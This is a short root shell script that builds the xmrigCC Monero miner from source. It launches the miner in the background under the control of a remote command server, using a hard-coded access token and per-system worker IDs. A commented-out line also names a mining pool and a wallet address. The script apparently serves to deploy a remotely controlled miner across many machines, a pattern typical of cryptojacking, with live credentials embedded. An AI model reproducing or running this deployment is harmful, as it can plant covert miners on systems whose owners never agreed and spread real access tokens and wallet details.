cd /root
apt update
apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev libmicrohttpd-dev -y
rm xmrigCC -r
git clone https://github.com/Bendr0id/xmrigCC.git
cd xmrigCC && mkdir build && cd build
cmake ..
make -j$(nproc)
./xmrigDaemon -k --cc-url=ccserver.buy9hits.com:80 --cc-access-token=hFCIifTSoRa2rM8jwOTu --cc-worker-id=$systemID
#./xmrigDaemon -o pool.minexmr.com:4444 -u 46rnJNvHVXAjdHWfrQndEJPJrWxjwL42zMNgCMH5vJyW97rGynsc4JjMu8TmxqcesR5Rjwk4QXHGEQ3Zi3NFSTPVVWoB1c5.$systemID -k --cc-url=ccserver.buy9hits.com:80 --cc-access-token=hFCIifTSoRa2rM8jwOTu --cc-worker-id=$systemID
